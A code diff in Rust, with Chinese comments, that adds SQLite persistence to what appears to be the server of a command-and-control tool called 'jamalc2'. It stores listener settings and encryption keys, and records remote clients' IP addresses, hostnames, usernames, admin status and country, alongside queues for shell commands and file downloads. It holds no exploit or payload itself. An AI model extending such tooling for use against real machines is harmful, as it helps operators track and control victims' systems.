@@ -6,6 +6,7 @@ use std::sync::Arc;
 use chrono::{DateTime, Utc};
 use serde::{Deserialize, Serialize};
 use shared::messages::ClientIdentification;
+use crate::db::{Database, ListenerRecord, ClientRecord};
 
 /// 连接的客户端信息
 #[derive(Debug, Clone, Serialize, Deserialize)]
@@ -115,17 +116,82 @@ pub struct AppState {
     pub file_responses: RwLock<HashMap<String, Vec<FileResponse>>>,
     /// 待处理的下载任务（client_id -> 下载文件路径列表）
     pub pending_downloads: RwLock<HashMap<String, Vec<String>>>,
+    /// 运行中的监听器关闭信号发送器
+    pub listener_shutdown: RwLock<HashMap<String, tokio::sync::oneshot::Sender<()>>>,
+    /// SQLite 数据库
+    pub db: Option<Database>,
 }
 
 impl AppState {
     pub fn new() -> Self {
+        // 初始化数据库
+        let db_path = dirs::data_dir()
+            .unwrap_or_else(|| std::path::PathBuf::from("."))
+            .join("jamalc2")
+            .join("jamalc2.db");
+        
+        let db = Database::new(db_path).ok();
+        
+        // 从数据库加载监听器
+        let mut listeners_map = HashMap::new();
+        if let Some(ref database) = db {
+            if let Ok(saved_listeners) = database.get_all_listeners() {
+                for l in saved_listeners {
+                    let config = ListenerConfig {
+                        id: l.id.clone(),
+                        name: l.name,
+                        bind_address: l.bind_address,
+                        port: l.port as u16,
+                        is_running: false,  // 重启后不自动运行
+                        encryption_key: l.encryption_key,
+                    };
+                    listeners_map.insert(l.id, config);
+                }
+                println!("[*] Loaded {} listeners from database", listeners_map.len());
+            }
+        }
+        
+        // 从数据库加载客户端（历史记录，不代表在线）
+        let mut clients_map = HashMap::new();
+        if let Some(ref database) = db {
+            if let Ok(saved_clients) = database.get_all_clients() {
+                for c in saved_clients {
+                    let client = ConnectedClient {
+                        id: c.id.clone(),
+                        ip_address: c.ip_address.unwrap_or_default(),
+                        version: String::new(),
+                        operating_system: c.os_version.unwrap_or_default(),
+                        account_type: if c.is_elevated { "Admin".to_string() } else { "User".to_string() },
+                        country: c.country.unwrap_or_default(),
+                        username: c.username.clone().unwrap_or_default(),
+                        pc_name: c.hostname.unwrap_or_default(),
+                        tag: c.tag.unwrap_or_default(),
+                        connected_at: Utc::now(),
+                        last_seen: c.last_seen
+                            .and_then(|s| DateTime::parse_from_rfc3339(&s).ok())
+                            .map(|dt| dt.with_timezone(&Utc))
+                            .unwrap_or_else(Utc::now),
+                        beacon_interval: c.beacon_interval as u64,
+                    };
+                    // 只加载最近24小时内活跃的客户端
+                    let hours_since = (Utc::now() - client.last_seen).num_hours();
+                    if hours_since < 24 {
+                        clients_map.insert(c.id, client);
+                    }
+                }
+                println!("[*] Loaded {} recent clients from database", clients_map.len());
+            }
+        }
+        
         Self {
-            clients: RwLock::new(HashMap::new()),
-            listeners: RwLock::new(HashMap::new()),
+            clients: RwLock::new(clients_map),
+            listeners: RwLock::new(listeners_map),
             pending_commands: RwLock::new(HashMap::new()),
             shell_responses: RwLock::new(HashMap::new()),
             file_responses: RwLock::new(HashMap::new()),
             pending_downloads: RwLock::new(HashMap::new()),
+            listener_shutdown: RwLock::new(HashMap::new()),
+            db,
         }
     }
     
@@ -150,11 +216,33 @@ impl AppState {
     
     /// 添加客户端
     pub fn add_client(&self, client: ConnectedClient) {
+        // 持久化到数据库
+        if let Some(ref db) = self.db {
+            let record = ClientRecord {
+                id: client.id.clone(),
+                ip_address: Some(client.ip_address.clone()),
+                hostname: Some(client.pc_name.clone()),
+                username: Some(client.username.clone()),
+                os_version: Some(client.operating_system.clone()),
+                tag: Some(client.tag.clone()),
+                is_elevated: client.account_type.to_lowercase().contains("admin"),
+                beacon_interval: client.beacon_interval as i32,
+                listener_id: None,
+                first_seen: Some(client.connected_at.to_rfc3339()),
+                last_seen: Some(client.last_seen.to_rfc3339()),
+                country: Some(client.country.clone()),
+                country_code: None,
+            };
+            let _ = db.save_client(&record);
+        }
         self.clients.write().insert(client.id.clone(), client);
     }
     
     /// 移除客户端
     pub fn remove_client(&self, id: &str) {
+        if let Some(ref db) = self.db {
+            let _ = db.delete_client(id);
+        }
         self.clients.write().remove(id);
         self.pending_commands.write().remove(id);
     }
@@ -166,14 +254,49 @@ impl AppState {
     
     /// 更新客户端最后在线时间
     pub fn update_last_seen(&self, id: &str) {
+        let now = Utc::now();
         if let Some(client) = self.clients.write().get_mut(id) {
-            client.last_seen = Utc::now();
+            client.last_seen = now;
+        }
+        if let Some(ref db) = self.db {
+            let _ = db.update_client_last_seen(id, &now.to_rfc3339());
         }
     }
     
     /// 添加监听器
     pub fn add_listener(&self, listener: ListenerConfig) {
+        // 持久化到数据库
+        if let Some(ref db) = self.db {
+            let record = ListenerRecord {
+                id: listener.id.clone(),
+                name: listener.name.clone(),
+                bind_address: listener.bind_address.clone(),
+                port: listener.port as i32,
+                encryption_key: listener.encryption_key.clone(),
+                is_running: listener.is_running,
+                created_at: Utc::now().to_rfc3339(),
+            };
+            let _ = db.save_listener(&record);
+        }
         self.listeners.write().insert(listener.id.clone(), listener);
+    }
+    
+    /// 删除监听器
+    pub fn delete_listener(&self, id: &str) {
+        if let Some(ref db) = self.db {
+            let _ = db.delete_listener(id);
+        }
+        self.listeners.write().remove(id);
+    }
+    
+    /// 更新监听器状态
+    pub fn update_listener_status(&self, id: &str, is_running: bool) {
+        if let Some(ref db) = self.db {
+            let _ = db.update_listener_status(id, is_running);
+        }
+        if let Some(listener) = self.listeners.write().get_mut(id) {
+            listener.is_running = is_running;
+        }
     }
     
     /// 获取所有监听器
